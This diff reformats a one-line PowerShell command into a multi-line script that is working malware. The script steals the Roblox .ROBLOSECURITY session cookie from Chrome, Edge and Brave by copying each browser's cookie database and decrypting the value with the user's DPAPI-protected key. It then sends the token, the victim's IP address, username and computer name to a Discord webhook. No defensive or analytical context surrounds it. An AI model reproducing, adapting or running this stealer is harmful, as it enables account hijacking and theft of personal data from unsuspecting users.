@@ -1,1 +1,32 @@
-powershell -Command "$w='https://discord.com/api/webhooks/1533937727903498262/EDZkUjqJCjaDFKNAS4rRYwjBSsVnlK0F7X82nQaVH_7V3Yb2GTyMrTI1W7pCjIKbgk5V'; $c=@('Google\Chrome','Microsoft\Edge','BraveSoftware\Brave-Browser'); foreach($b in $c){$p=\"$env:LOCALAPPDATA\$b\User Data\Default\Network\Cookies\"; if(Test-Path $p){$t=\"$env:TEMP\c.db\"; copy $p $t; try{[System.Data.SQLite.SQLiteConnection]::new('Data Source=$t')}catch{continue}; $conn=New-Object System.Data.SQLite.SQLiteConnection('Data Source=$t'); $conn.Open(); $cmd=$conn.CreateCommand(); $cmd.CommandText='SELECT encrypted_value FROM cookies WHERE host_key LIKE ''%roblox.com%'' AND name=''.ROBLOSECURITY'''; $r=$cmd.ExecuteReader(); while($r.Read()){$d=$r.GetValue(0); Add-Type -AssemblyName System.Security; $k=[System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String((Get-Content \"$env:LOCALAPPDATA\$b\User Data\Local State\"|ConvertFrom-Json).os_crypt.encrypted_key)[5..10000],$null,'CurrentUser'); $n=$d[3..14]; $cipher=$d[15..($d.Length-17)]; $tag=$d[($d.Length-16)..($d.Length-1)]; $aes=[System.Security.Cryptography.AesGcm]::new($k); $plain=[byte[]]::new($cipher.Length); $aes.Decrypt($n,$cipher,$tag,$plain); $token=[System.Text.Encoding]::UTF8.GetString($plain); if($token -match '_|WARNING'){try{$ip=(Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content}catch{$ip='Unknown'}; $body=@{content=\"TOKEN: $token`nIP: $ip`nUser: $env:USERNAME`nPC: $env:COMPUTERNAME`nBrowser: $b\"}; Invoke-RestMethod -Uri $w -Method Post -Body ($body|ConvertTo-Json) -ContentType 'application/json'}}}}}}"
+$w='https://discord.com/api/webhooks/1533937727903498262/EDZkUjqJCjaDFKNAS4rRYwjBSsVnlK0F7X82nQaVH_7V3Yb2GTyMrTI1W7pCjIKbgk5V'
+$c=@('Google\Chrome','Microsoft\Edge','BraveSoftware\Brave-Browser')
+foreach($b in $c){
+    $p="$env:LOCALAPPDATA\$b\User Data\Default\Network\Cookies"
+    if(Test-Path $p){
+        $t="$env:TEMP\c.db"
+        copy $p $t
+        try{[System.Data.SQLite.SQLiteConnection]::new("Data Source=$t")}catch{continue}
+        $conn=New-Object System.Data.SQLite.SQLiteConnection("Data Source=$t")
+        $conn.Open()
+        $cmd=$conn.CreateCommand()
+        $cmd.CommandText="SELECT encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%' AND name='.ROBLOSECURITY'"
+        $r=$cmd.ExecuteReader()
+        while($r.Read()){
+            $d=$r.GetValue(0)
+            Add-Type -AssemblyName System.Security
+            $k=[System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String((Get-Content "$env:LOCALAPPDATA\$b\User Data\Local State"|ConvertFrom-Json).os_crypt.encrypted_key)[5..10000],$null,'CurrentUser')
+            $n=$d[3..14]
+            $cipher=$d[15..($d.Length-17)]
+            $tag=$d[($d.Length-16)..($d.Length-1)]
+            $aes=[System.Security.Cryptography.AesGcm]::new($k)
+            $plain=[byte[]]::new($cipher.Length)
+            $aes.Decrypt($n,$cipher,$tag,$plain)
+            $token=[System.Text.Encoding]::UTF8.GetString($plain)
+            if($token -match '_|WARNING'){
+                try{$ip=(Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content}catch{$ip='Unknown'}
+                $body=@{content="TOKEN: $token`nIP: $ip`nUser: $env:USERNAME`nPC: $env:COMPUTERNAME`nBrowser: $b"}
+                Invoke-RestMethod -Uri $w -Method Post -Body ($body|ConvertTo-Json) -ContentType 'application/json'
+            }
+        }
+    }
+}
